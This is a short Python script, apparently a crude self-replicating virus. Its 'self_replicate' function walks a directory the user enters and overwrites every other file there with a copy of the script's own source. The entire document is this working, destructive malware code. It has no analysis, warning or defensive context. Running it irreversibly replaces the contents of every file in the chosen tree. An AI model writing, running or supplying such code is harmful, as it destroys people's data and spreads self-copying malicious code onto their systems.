import os
import shutil


def self_replicate(directory):
    filename = __file__
    for root, dirs, files in os.walk(directory):
        for name in files:
            if name != os.path.basename(filename):
                shutil.copyfile(filename, os.path.join(root, name))


if __name__ == "__main__":
    directory = input("Enter the directory to replicate: ")
    self_replicate(directory)
